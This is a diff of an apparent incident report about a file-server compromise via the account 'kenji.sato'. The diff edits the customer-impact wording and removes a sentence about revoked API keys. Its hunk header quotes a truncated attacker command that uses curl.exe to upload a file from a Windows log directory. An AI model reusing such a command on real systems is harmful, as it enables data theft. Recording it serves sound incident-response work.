@@ -45,7 +45,7 @@ Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\C
 
 ## Stakeholder Impact:
 ### Customers:
-- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Potential future impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. In addition, some API keys were revoked which may have led to a brief period of downtime for customers. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.
+- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.
 
 ### Employees:
 - The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.
